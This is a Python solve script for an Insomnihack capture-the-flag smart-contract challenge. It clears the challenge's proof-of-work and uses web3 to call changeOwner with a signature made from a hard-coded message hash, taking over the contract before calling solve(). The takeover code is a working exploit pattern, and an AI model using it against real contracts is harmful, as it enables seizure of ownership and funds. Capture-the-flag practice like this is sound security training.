import json
from web3 import Web3
from pwn import *
from eth_account import Account, messages
import string

r = remote(args.get('HOST', "revengery.insomnihack.ch"), args.get('PORT', 9056))

r.recvuntil(b"action? ")
r.sendline(b"1")

r.recvuntil(b"prefix:")
prefix = r.recvline().strip().decode()
r.recvuntil(b"difficulty:")
difficulty = int(r.recvline().strip().decode())
TARGET = 2 ** (256 - difficulty)
alphabet = string.ascii_letters + string.digits + "+/"
answer = iters.bruteforce(
    lambda x: int.from_bytes(util.hashes.sha256sum((prefix + x).encode()), "big")
    < TARGET,
    alphabet,
    length=5,
)
r.sendlineafter(b">", answer.encode())

r.recvuntil(b"token:")
token = r.recvline().strip()
print(f"Token: {token}")
r.recvuntil(b"rpc endpoint:")
rpc_url = r.recvline().strip().decode()
print(f"URL: {rpc_url}")
print(f"RPC endpoint: {rpc_url}")
r.recvuntil(b"private key:")
privk = r.recvline().strip().decode()
r.recvuntil(b"challenge contract:")
challenge_addr = r.recvline().strip().decode()




# You need contract's ABI
with open('abi.json', 'r') as openfile:
    abi = json.load(openfile)

w3 = Web3(Web3.HTTPProvider(rpc_url))

# Print block details
#latest_block = w3.eth.get_block("latest")
latest_block =  w3.eth.get_block(1)
print(f"Block Number: {latest_block.number}")
print(f"Block Hash: {latest_block.hash.hex()}")
print(f"Miner: {latest_block.miner}")
print(f"Gas Used: {latest_block.gasUsed}")
print(f"Timestamp: {latest_block.timestamp}")
print(f"Transactions Count: {len(latest_block.transactions)}")
print(f"Block Number: {latest_block.number}")
# Create smart contract instance
contract = w3.eth.contract(address=challenge_addr, abi=abi)
private_key = privk  # Use your private key
account = Web3().eth.account.from_key(private_key)
print(f"owner: {contract.functions.owner().call()}")
owner = contract.functions.owner().call()
print(f"myAddress: {account.address}")
add="0x8E2227b11dd10a991b3CB63d37276daC4E4b9417"
print(f"count:{w3.eth.get_transaction_count(add)}")
print(f"count owner:{w3.eth.get_transaction_count(owner)}")
signer_addr = contract.functions.signer_addr().call()
print(f"signer address:{signer_addr}")
# Prepare the parameters
new_owner = '0x0000000000000000000000000000000000000000'  # New owner address
hash_to_sign = w3.solidity_keccak(['string'], ['some data to sign'])  # The hash to be signed (this must match what is expected)
# Convert hash to bytes32 (make sure it's already in bytes32 format or correctly hashed)
hash_bytes32 = Web3.to_bytes(hash_to_sign)

# 1. Sign the hash with the signer's private key
#message = encode_defunct(primitive=hash_bytes32)
#signed_message = Account.sign_message(message, private_key)
#signature = signed_message.signature
msg_hash_hex = "058c3b4c8e5dc4632b5c6b861b2c1861d53e426dc673c907ddf2651942b0f230"


#// This part prepares "version E" messages, using the EIP-191 standard
message = messages.encode_defunct(hexstr=msg_hash_hex)

#// This part signs any EIP-191-valid message
signed_message = Account.sign_message(message, private_key= private_key)
print("signature =", signed_message.signature.hex())

signature = signed_message.signature
# 2. Build the transaction to call the function changeOwner
tx = contract.functions.changeOwner(signature, hash_bytes32, new_owner).build_transaction({
    'from': account.address,
    'gas': 200000,  # Adjust the gas limit accordingly
    'gasPrice': w3.to_wei('5', 'gwei'),
    'nonce': w3.eth.get_transaction_count(account.address),
})

# 3. Sign the transaction with the newOwner's private key
#private_key_new_owner = "NEW_OWNER_PRIVATE_KEY"  # Replace with new owner's private key
signed_tx = w3.eth.account.sign_transaction(tx, private_key)

# 4. Send the transaction
try:
    tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
    print(f"Transaction sent: {tx_hash.hex()}")

    # 5. Wait for the transaction receipt
    receipt = w3.eth.wait_for_transaction_receipt(tx_hash)

    if receipt['status'] == 1:
        print(f"Ownership transfer succeeded. Block number: {receipt.blockNumber}")


    else:
        print(receipt)
        print("Transaction failed (contract revert or other reason).")
        try:
            # This part is where we extract the revert reason
            if receipt['status'] == 0:
                # If the transaction failed, we get the error message from the receipt
                transaction_receipt = w3.eth.get_transaction_receipt(tx_hash)
                """revert_message = w3.eth.call({
                    'to': challenge_addr,
                    'data': tx['input']
                })
                # Check if the message contains revert data
                print(f"Revert reason: {revert_message.decode()}")"""
        except Exception as e:
            print(f"Error decoding revert message: {str(e)}")

except Exception as e:
    print(f"Error occurred: {str(e)}")



tx = contract.functions.solve().build_transaction({
    'from': account.address,
    'gas': 200000,  # Adjust gas as needed
    'gasPrice': w3.to_wei('5', 'gwei'),
    'nonce': w3.eth.get_transaction_count(account.address),
})
signed_tx = w3.eth.account.sign_transaction(tx, private_key)
tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
#contract.functions.solve().call()
print(f"Transaction sent: {tx_hash.hex()}")

# Wait for the transaction receipt
try:
    receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
    print(f"Transaction confirmed in block: {receipt.blockNumber}")
    if receipt['status'] == 0:
        print(f"error: {receipt.blockNumber}")
except Exception as e:
    print(f"Error occurred: {str(e)}")
#contract.functions.solve().call()
print(f"Is challenge solved: {contract.functions.isSolved().call()}")
